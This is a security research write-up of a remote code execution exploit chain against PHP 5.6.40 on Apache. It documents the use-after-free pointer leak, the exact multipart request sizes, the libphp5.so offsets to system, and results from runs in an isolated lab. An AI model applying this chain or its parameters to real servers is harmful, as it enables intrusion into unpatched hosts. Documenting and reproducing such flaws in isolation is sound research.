# PHP 5.6.40 mbstring reflection to HTTP-only RCE

## Result

The pinned PHP 5.6.40 Apache image reaches the fixed proof command
`id>/out/p` using an address obtained from an HTTP response.  Three fresh
containers with independent ASLR all produced the `www-data` uid/gid proof.
The final runner uses no `LD_PRELOAD`, debugger, `/proc/*/maps`, or
`/proc/*/mem`.

The final request sequence is:

1. one warm request and the 12 MiB upload-progress stale-state producer;
2. an mbstring POST-reflection request that returns a `libphp5.so` pointer;
3. a one-second wait while Apache replaces the faulted prefork child;
4. the established 12 MiB terminal producer in the replacement child;
5. the ZE2 fake-`HashTable` terminal consumer with `id>/out/p`.

## HTTP address disclosure

The disclosure consumer uses this exact multipart geometry:

```text
field order                    900001 -> 900002 -> PHPSESSID -> progress
900001 value length            1048551
900002 value length            1041384
PHPSESSID value length         30
progress value / length        xyzxyzxy / 8
multipart boundary length      78
producer pads                  32
```

`leak.php` reads only
`$_POST['PHP_SESSION_UPLOAD_PROGRESS']`, hex-encodes it, and flushes it.  A
successful response is partial because the worker faults later, but its first
three HTTP chunks contain a complete value such as:

```text
PROGRESSHEX:80acc8e9f17f0000
```

Little-endian decoding gives `0x7ff1e9c8ac80`.  The exact ELF symbol table
identifies the value as:

```text
libphp5.so!mbfl_encoding_ascii = libphp5.so + 0xca0c80
libphp5.so!mbfl_encoding_utf8  = libphp5.so + 0xca1f00
```

The final client therefore derives all terminal addresses as follows:

```text
libphp base = HTTP pointer - 0xca0c80
system      = libphp base + 0x3a74480
stale zval  = libphp base + 0x48103c0
carrier     = libphp base + 0x480c628
            = stale zval - 0x3d98
```

Every derived libphp base in the final runs is page aligned.

This HTTP leak requires an application response sink equivalent to the bundled
`leak.php`: it must read the affected POST value and reflect its bytes before
the worker exits. The result is exact-build technical evidence, not a claim
that every PHP 5.6 application exposes the same response surface.

## Why the pointer is reflected

Calibration was performed separately from the final runs. The exact 8-byte
filtered POST backing occupies a 32-byte Zend-MM block. Session cleanup frees
that block while the POST zval still retains its value pointer and length. The
subsequent mbstring two-entry detection-order allocation is 16 bytes and uses
the same 32-byte block. It writes
`&mbfl_encoding_ascii` and `&mbfl_encoding_utf8` into the first two qwords.
The flushed PHP response reads the first eight bytes through the dangling
POST value.

That calibration records:

```text
POST_FREE_AS_ID            address=0x...2cd0 request=9 block=32
MBSTRING_LIST_ALLOC        address=0x...2cd0 request=16 block=32
MBSTRING_LIST_WRITTEN_MATCH q0=libphp+0xca0c80 q1=libphp+0xca1f00
```

The publication omits raw calibration traces. The three final chains below
load no calibration helper. Their only address
source is `PROGRESSHEX` in the HTTP response.

## Fresh-ASLR evidence

| Run | HTTP pointer | libphp base | `system` | stale zval | carrier | Proof |
| --- | --- | --- | --- | --- | --- | --- |
| `fresh-aslr-1` | `0x7ff1e9c8ac80` | `0x7ff1e8fea000` | `0x7ff1eca5e480` | `0x7ff1ed7fa3c0` | `0x7ff1ed7f6628` | uid/gid 33 |
| `fresh-aslr-2` | `0x7fc7cbbe4c80` | `0x7fc7caf44000` | `0x7fc7ce9b8480` | `0x7fc7cf7543c0` | `0x7fc7cf750628` | uid/gid 33 |
| `fresh-aslr-3` | `0x79976ce00c80` | `0x79976c160000` | `0x79976fbd4480` | `0x7997709703c0` | `0x79977096c628` | uid/gid 33 |

Each run contains:

- `client/address-source.json`: raw HTTP bytes, symbol identity, formulas,
  addresses, request statuses, and explicit instrumentation flags;
- `proof.txt`: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`;
- `target.inspect.json`: exact image ID, empty `PortBindings`, and no
  `LD_PRELOAD` environment entry;
- `network.inspect.json`: `Internal: true`;
- immutable target and attacker image inspection records.

## Exact runtime and isolation

- target image:
  `mirror.gcr.io/library/php@sha256:0a40fd273961b99d8afe69a61a68c73c04bc0caa9de384d3b2dd9e7986eec86d`
- target image ID:
  `sha256:24c791995c1e498255393db857040793a7a040fa0f8ddd4bbe8fb230648e37d7`
- PHP / SAPI: PHP 5.6.40 / Apache 2 handler, NTS
- `libphp5.so` SHA-256:
  `9f94934fafe670a2357a21bb0c2048e6ae01af70f975417c0781b905bd2fad15`
- `libphp5.so` build ID:
  `de73df9b84099adac850001a3b86add410e19501`
- glibc 2.24 SHA-256:
  `b2c8bf64c2cafdce5cb263cc100749b5e6b3e4783eef2fff16ae1b4bc5633e16`
- glibc build ID:
  `aa889e26a70f98fa8d230d088f7cc5bf43573163`

Every target uses a fresh Docker `--internal` network and has no published
ports.  The attacker container is read-only, has all capabilities dropped,
and can reach only the target on that internal network.  A fresh named volume
holds the fixed local proof file.

## Reproduction

From this directory inside WSL/Linux:

```bash
./run-http-only.sh LABEL
```

The runner verifies both immutable image IDs before starting, asserts PHP
5.6.40, asserts empty Docker port bindings and absence of `LD_PRELOAD`, then
requires the uid/gid 33 proof before returning success.
